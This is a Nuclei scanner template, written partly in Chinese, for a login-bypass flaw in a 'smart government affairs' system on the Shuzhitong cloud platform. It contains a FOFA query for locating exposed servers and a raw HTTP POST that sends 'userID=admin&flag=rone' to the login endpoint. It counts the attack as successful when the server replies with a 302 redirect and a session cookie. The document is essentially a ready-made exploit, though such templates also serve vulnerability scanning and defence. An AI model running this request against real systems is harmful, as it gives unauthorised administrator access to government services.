id: shuzhitong-login-bypass

info:
  name: 数字通云平台的智慧政务系统存在登录绕过漏洞
  author: qwtd
  severity: high
  description: 数字通云平台的智慧政务系统存在登录绕过漏洞，攻击者可利用该漏洞进行登录。
  metadata:
    fofa: body="assets/8cca19ff/css/bootstrap-yii.css"
    verified: true
  tags: 数字通云平台的智慧政务系统

http:
  - raw:
      - |
        POST /portal/default/login HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Content-Type: application/x-www-form-urlencoded
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0

        userID=admin&flag=rone

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Set-Cookie"
          - "Location: /theme/app"
        part: header
        condition: and
      - type: status
        status:
          - 302